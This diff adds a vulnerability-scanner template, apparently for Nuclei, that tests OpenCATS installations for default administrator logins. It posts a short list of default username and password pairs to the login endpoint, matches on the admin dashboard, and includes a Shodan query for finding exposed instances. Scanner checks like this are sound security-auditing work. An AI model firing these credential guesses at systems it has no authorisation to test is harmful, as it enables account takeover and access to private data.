@@ -1,0 +1,52 @@
+http:
+    - attack: pitchfork
+      cookie-reuse: true
+      host-redirects: true
+      matchers:
+        - condition: and
+          type: word
+          words:
+            - <title>OpenCATS - Home</title>
+            - CATS Administrator
+            - Dashboard
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      max-redirects: 2
+      payloads:
+        password:
+            - admin
+            - cats
+            - password
+            - john99
+        username:
+            - admin
+            - cats@rootadmin
+            - john@mycompany.net
+            - username
+      raw:
+        - |
+          POST /index.php?m=login&a=attemptLogin HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          username={{username}}&password={{password}}
+id: opencats-default-login
+info:
+    author: arafatansari
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+        cvss-score: 8.3
+        cwe-id: CWE-522
+    description: OpenCATS contains a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    metadata:
+        max-request: 4
+        shodan-query: title:"opencats"
+        verified: true
+    name: OpenCATS - Default Login
+    severity: high
+    tags:
+        - default-login
+        - opencats
+        - OpenCATS
